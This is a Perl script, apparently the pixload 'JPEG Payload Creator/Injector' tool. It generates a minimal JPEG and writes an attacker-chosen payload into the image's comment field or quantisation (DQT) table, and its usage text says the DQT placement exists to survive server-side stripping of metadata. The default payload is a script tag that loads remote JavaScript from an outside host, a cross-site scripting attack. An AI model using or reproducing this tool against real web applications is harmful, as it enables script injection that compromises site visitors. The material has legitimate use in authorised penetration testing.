#!/usr/bin/env perl
#
# JPEG Payload Creator/Injector
#
# coded by chinarulezzz, alexandr.savca89@gmail.com
#
# See LICENSE file for copyright and license details.
#

use strict;
use warnings;
use feature 'say';

use Getopt::Long;
use Image::ExifTool ':Public';
use POSIX;

sub usage;
sub create_jpg;
sub inject_payload_to_comm;
sub inject_payload_to_dqt;

# Command line options
GetOptions(
    'help!'     =>  \my $help,
    'place=s'   =>  \my $place,
    'payload=s' =>  \my $payload,
    'output=s'  =>  \my $outfile,
);
usage(0)     if $help;
usage(1) unless $place and $outfile;

$payload //= '<script src=//nji.xyz></script>';

say <<EOF;
[>|      JPEG Payload Creator/Injector      |<]

    https://github.com/chinarulezzz/pixload

EOF

if (uc $place eq 'COM') {
    create_jpg          unless -f $outfile;
    inject_payload_to_comm;
}
elsif (uc $place eq 'DQT') {
    die "The payload size must not exceed 64 bytes!\n"
        if length($payload) > 64;

    create_jpg;
    inject_payload_to_dqt;
}
else {
    die "-place option argument must be COM or DQT\n";
}

say `file       $outfile`   if -f '/usr/bin/file';
say `hexdump -C $outfile`   if -f '/usr/bin/hexdump';

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#                                Subroutines                                  #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

sub usage {
    say <<"EOF";
Usage: $0 -place COM|DQT [-payload 'STRING'] -output payload.jpg

-place COM:
  The payload will be injected as a 'COMMENT'.

  If the output file exists, then the payload will be injected into the
  existing file.  Else the new one will be created.

-place DQT:
  The payload will be injected into 'DQT table'.

  LIMITATION:
    1. payload size must not exceed 64 bytes.
    2. no injection support, only new file generation.

  This is necessary in case the server application processes images and
  removes comments, application-specific data, etc.

  The data in DQT table must remain intact.

  ! If the output file exists, then it will be rewritten. !
EOF
    exit +shift;
}

sub create_jpg {
    say "[>] Generating output file";

    sysopen my $fh, $outfile, O_CREAT|O_WRONLY;
    syswrite   $fh, "\xff\xd8";                                # SOI
    syswrite   $fh, "\xff\xdb";                                # DQT
    syswrite   $fh, pack('S>', 67);                            # DQT SIZE
    syswrite   $fh, "\x00" . "\x01" x 64;                      # DQT DATA
    syswrite   $fh, "\xff\xc2";                                # SOF
    syswrite   $fh, "\x00\x0b";                                # SOF SIZE
    syswrite   $fh, "\x08\x00\x01\x00\x01\x01\x01\x11\x00";    # SOF DATA
    syswrite   $fh, "\xff\xc4";                                # DHT
    syswrite   $fh, "\x00\x14";                                # DHT SIZE
    syswrite   $fh, "\x00\x01\x00\x00\x00\x00\x00\x00\x00".    # DHT DATA
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x03";
    syswrite   $fh, "\xff\xda";                                # SOS
    syswrite   $fh, "\x00\x08";                                # SOS SIZE
    syswrite   $fh, "\x01\x01\x00\x00\x00\x01\x3f";            # SOS DATA
    syswrite   $fh, "\xff\xd9";                                # EOI

    close      $fh;

    say "[✔] File saved to: $outfile\n";
}

sub inject_payload_to_comm {
    say "[>] Injecting payload into COMMENT";

    my $exifTool = Image::ExifTool->new;

    $exifTool->SetNewValue('Comment', $payload)
        or die "[✘] Fail to SetNewValue\n";

    $exifTool->WriteInfo($outfile)
        or die "[✘] Fail to WriteInfo\n";

    say "[✔] Payload was injected successfully\n";
}

sub inject_payload_to_dqt {
    say "[>] Injecting payload into DQT table";

    my $payload_len = length $payload;

    sysopen my $fh, $outfile, O_WRONLY;
    sysseek    $fh, (7 + (64 - $payload_len)), SEEK_SET;
    syswrite   $fh, $payload;
    close      $fh;

    say "[✔] Payload was injected succesfully\n";
}

# vim:sw=4:ts=4:sts=4:et:cc=80
# End of file
